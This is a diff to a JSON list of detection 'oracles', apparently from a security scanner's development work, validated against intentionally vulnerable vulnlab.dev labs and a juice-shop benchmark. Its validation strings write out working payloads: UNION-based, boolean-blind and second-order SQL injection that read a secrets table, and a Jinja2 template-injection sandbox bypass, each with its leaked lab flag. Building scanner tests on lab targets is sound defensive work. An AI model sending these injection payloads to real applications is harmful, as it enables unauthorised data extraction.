@@ -2,6 +2,24 @@
   "candidates": [
     {
       "source": "discovery:sqli.vulnlab.dev",
+      "slug": "sqli-vulnlab-union-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /union/?category=widgets' UNION SELECT name, value, 0 FROM secrets-- leaks VULNLAB{sqli-union-based-extraction}; sqli.vulnlab.dev/union findings 3→6 (+sqli-vulnlab-union-live-oracle + route, replaces error-oracle FP); benchmark juice-shop 32 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:sqli.vulnlab.dev",
+      "slug": "sqli-vulnlab-blind-bool-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /blind-bool/?id=1 AND SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-bool'),1,1)='V' → Widget Pro vs 'Z' → Not found; sqli.vulnlab.dev/blind-bool findings 4→6 (+sqli-vulnlab-blind-bool-live-oracle + route); benchmark 32 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:ssti.vulnlab.dev",
+      "slug": "ssti-vulnlab-sandboxed-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /sandboxed/?greeting={{ dump_diagnostics() }} → pre.rendered leaks VULNLAB{ssti-jinja2-sandbox-bypassed-via-helper}; ssti.vulnlab.dev/sandboxed findings 2→8 (+ssti-vulnlab-sandboxed-live-oracle + route); benchmark 32 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:sqli.vulnlab.dev",
       "slug": "sqli-vulnlab-second-order-live-oracle",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: POST /second-order/register username=' UNION SELECT value FROM secrets WHERE name='sqli-second-order'# then GET /second-order/profile?id= leaks VULNLAB{sqli-second-order-via-stored-input}; sqli.vulnlab.dev/second-order findings 2→4 (+sqli-vulnlab-second-order-live-oracle + route); benchmark juice-shop 32 findings 6/6 maintained"
